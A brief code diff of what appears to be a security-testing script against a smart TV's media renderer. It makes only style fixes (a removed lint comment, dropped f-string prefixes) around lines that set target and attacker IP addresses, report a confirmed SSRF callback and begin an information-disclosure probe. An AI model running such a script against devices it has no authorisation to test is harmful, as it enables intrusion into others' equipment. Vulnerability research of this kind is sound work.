@@ -19,7 +19,7 @@ _project_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
 os.makedirs(_project_tmp, exist_ok=True)
 tempfile.tempdir = _project_tmp
 
-import requests  # noqa: E402
+import requests
 
 TARGET = "192.168.18.6"
 ATTACKER = "192.168.18.147"
@@ -170,9 +170,9 @@ def main():
     srv.shutdown()
 
     if HITS:
-        log(f"\n    [!!] SSRF CONFIRMED — TV fetched attacker URI!", {"hits": HITS})
+        log("\n    [!!] SSRF CONFIRMED — TV fetched attacker URI!", {"hits": HITS})
     else:
-        log(f"\n    [!] No callback in 10s (TV may be on non-home screen or DMR busy)")
+        log("\n    [!] No callback in 10s (TV may be on non-home screen or DMR busy)")
 
     # ── Step 4: transport state info disclosure ────────────────────────────
     log("\n[4] Transport state (info disclosure)...")
